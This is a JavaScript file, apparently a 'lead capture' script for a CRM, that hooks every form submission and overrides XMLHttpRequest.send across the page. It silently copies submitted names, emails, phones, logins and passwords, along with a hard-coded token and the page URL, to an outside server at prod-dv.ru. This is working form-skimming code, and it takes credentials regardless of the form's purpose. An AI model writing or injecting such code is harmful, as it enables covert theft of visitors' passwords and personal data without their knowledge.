function createXMLHttp() {
    if (typeof XMLHttpRequest != "undefined") {
        return new XMLHttpRequest();
    } else if (window.ActiveXObject) {
        var aVersions = [
            "MSXML2.XMLHttp.5.0",
            "MSXML2.XMLHttp.4.0",
            "MSXML2.XMLHttp.3.0",
            "MSXML2.XMLHttp",
            "Microsoft.XMLHttp"
        ];
        for (var i = 0; i < aVersions.length; i++) {
            try {
                var oXmlHttp = new ActiveXObject(aVersions[i]);
                return oXmlHttp;
            } catch (oError) {}
        }
        throw new Error("Невозможно создать объект XMLHttp.");
    }
}

function getRequestBody(oForm) {
    var aParams = new Array();
    var sParam = encodeURIComponent('token');
    var block = 'yes';
    sParam += "=";
    sParam += encodeURIComponent('f27e7feb-7890-206f-ce3d-090c18bc63bd');
    aParams.push(sParam);
    aParams.push(encodeURIComponent('lred_type') + "=" + encodeURIComponent('Universal'));
    aParams.push(encodeURIComponent('lred_site') + "=" + encodeURIComponent(window.location.hostname));
    aParams.push(encodeURIComponent('lred_site_page') + "=" + encodeURIComponent(window.location.href));

    //        console.log(aParams);
    //        console.log(sParam);
    //        console.log('002');

    for (var i = 0; i < oForm.elements.length; i++) {
        var sParam = encodeURIComponent(oForm.elements[i].name);
        sParam += "=";
        sParam += encodeURIComponent(oForm.elements[i].value);
        aParams.push(sParam);

        /*        if(oForm.elements[i].name == 'smail' || oForm.elements[i].name == 'email' || oForm.elements[i].name == 'e-mail' || oForm.elements[i].name == 'mail'
                || oForm.elements[i].name == 'phone' || oForm.elements[i].name == 'my_fullname' || oForm.elements[i].name == 'fullname' || oForm.elements[i].name == 'fio' || oForm.elements[i].name == 'f_name' || oForm.elements[i].name == 'tsname' || oForm.elements[i].name == 'customer[name]' || oForm.elements[i].name == 'customer[phone]' || oForm.elements[i].name == 'tsmail' || oForm.elements[i].name == 'tshonss'
                || oForm.elements[i].name == 'firstname' || oForm.elements[i].name == 'lastname' || oForm.elements[i].name == 'password' || oForm.elements[i].name == 'login' || oForm.elements[i].name == 'name') {*/

        if (oForm.elements[i].name == 'fio' || oForm.elements[i].name == 'tshonss' || oForm.elements[i].name == 'password' || oForm.elements[i].name == 'login' ||
            oForm.elements[i].name.match(/\name\b/i) !== null || oForm.elements[i].name.match(/\phone\b/i) !== null || oForm.elements[i].name.match(/\mail\b/i) !== null) {
            if (oForm.elements[i].value.length > 3) {
                block = 'no'
                //console.log('OKEY');
            }
        }
        //console.log(oForm.elements[i].name + '-' + oForm.elements[i].value);


    }

    if (block == 'yes') {
        return '';
    }

    return aParams.join("&");
}

function postAjax(url, oForm, callback, oMetod) {
    var oXmlHttp = createXMLHttp();
    if (oMetod == 'Post') var sBody = getRequestBody(oForm);
    else if (oMetod == 'Ajax') var sBody = oForm;

    if (sBody.length < 10) {
        return false;
    }

    oXmlHttp.open("POST", url, true);
    oXmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    oXmlHttp.onreadystatechange = function () {
        if (oXmlHttp.readyState == 4) {
            if (oXmlHttp.status == 200) {
                callback(oXmlHttp.responseText);
            } else {
                callback('error' + oXmlHttp.statusText);
            }
        }
    };
    oXmlHttp.send(sBody);
}

function printPost(text) {}


//console.log('001');


function addXMLRequestCallback(callback) {
    var oldSend, i;
    if (XMLHttpRequest.callbacks) {
        XMLHttpRequest.callbacks.push(callback);
    } else {
        XMLHttpRequest.callbacks = [callback];
        oldSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function () {

            for (i = 0; i < XMLHttpRequest.callbacks.length; i++) {
                XMLHttpRequest.callbacks[i](this);
            }
            oldSend.apply(this, arguments);

            if (arguments != null && arguments[0] != null) {
                var aTrue = '';
                var aParams = new Array();
                //console.log(arguments[0]);


                function getQueryVariable(queryString) {

                    var vars = queryString.split("&");
                    var arr = new Array();

                    for (var i = 0; i < vars.length; i++) {

                        var pair = vars[i].split("=");
                        arr[pair[0]] = pair[1];
                    }
                    return arr;
                }

                var queryParams = getQueryVariable(decodeURIComponent(arguments[0]));

                //var new_form = 0;

                //Ajax 2.0
                if (queryParams['red_data[fio]'] && !queryParams['no_otprav']) {

                    var newParams_two = arguments[0] + '&token=f27e7feb-7890-206f-ce3d-090c18bc63bd&no_otprav=true&lred_site=' + encodeURIComponent(window.location.hostname) + '&lred_site_page=' + encodeURIComponent(window.location.href) + '&lred_type=' + encodeURIComponent('Ajax v2.0');
                    //console.log('1b');
                    //console.log(newParams);
                    //console.log('red_data[fio]');
                    //console.log('no_otprav');
                    postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', newParams_two, printPost, 'Ajax');
                }


                //Ajax Other    var animals = ['dog', 'cat', 'hamster', 'bird', 'fish']; alert( animals.indexOf( 'dog' ) != -1 );
                /*                    else if (( queryParams['fio'] || queryParams['tshonss'] || queryParams['password'] || queryParams['login']
                                    || oForm.elements[i].name.match(/\name\b/i) !== null || oForm.elements[i].name.match(/\phone\b/i) !== null || oForm.elements[i].name.match(/\mail\b/i) !== null
                                    ) && !queryParams['no_otprav'] ) {*/
                else if ((queryParams['smail'] || queryParams['email'] || queryParams['e-mail'] || queryParams['mail'] ||
                        queryParams['phone'] || queryParams['my_fullname'] || queryParams['fullname'] || queryParams['fio'] || queryParams['f_name'] || queryParams['tsname'] || queryParams['customer[name]'] || queryParams['customer[phone]'] || queryParams['tsmail'] || queryParams['tshonss'] ||
                        queryParams['firstname'] || queryParams['lastname'] || queryParams['password'] || queryParams['login'] || queryParams['name']) && !queryParams['no_otprav']) {

                    var newParams_two = arguments[0] + '&token=f27e7feb-7890-206f-ce3d-090c18bc63bd&no_otprav=true&lred_site=' + encodeURIComponent(window.location.hostname) + '&lred_site_page=' + encodeURIComponent(window.location.href) + '&lred_type=' + encodeURIComponent('Ajax Other');
                    console.log('1');

                    //console.log(queryParams);
                    //console.log('1');


                    /*for (var keysmy in queryParams){
                        if (queryParams.hasOwnProperty(keysmy)) {
                        if ( keysmy.match(/\name\b/i) !== null ) {
                            console.log('yes!!');
                        }

                            console.log("Key is " + keysmy + ", value is" + queryParams[keysmy]);
                        }
                    }*/


                    //console.log(newParams);
                    //console.log('red_data[fio]');
                    //console.log('no_otprav');
                    postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', newParams_two, printPost, 'Ajax');
                }


                //Ajax 5.0
                else {

                    for (var [key, value] of arguments[0]) {
                        //console.log(key);
                        //console.log(value);
                        aParams.push(encodeURIComponent(key) + "=" + encodeURIComponent(value));
                        if ((key == 'lreddata[lred_name]' || key == 'lreddata[lred_email]' || key == 'red_data[fio]') && key != 'no_otprav') {
                            aTrue = 'ok';
                            aParams.push(encodeURIComponent('token') + "=" + encodeURIComponent('f27e7feb-7890-206f-ce3d-090c18bc63bd'));
                            aParams.push(encodeURIComponent('no_otprav') + "=" + encodeURIComponent('true'));
                            aParams.push(encodeURIComponent('lred_site') + "=" + encodeURIComponent(window.location.hostname));
                            aParams.push(encodeURIComponent('lred_site_page') + "=" + encodeURIComponent(window.location.href));
                            aParams.push(encodeURIComponent('lred_type') + "=" + encodeURIComponent('Ajax v5.0'));
                        }
                    }
                    //console.log(aTrue);
                    var newParams = aParams.join("&");
                    //console.log(newParams);
                    if (aTrue == 'ok') {
                        //console.log('2a');
                        postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', newParams, printPost, 'Ajax');
                    }
                }
            }
        }
    }
}

addXMLRequestCallback(function (xhr) {});


window.document.body.addEventListener('submit', function (event) {
    postAjax('https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php', event.target, printPost, 'Post');
}, true);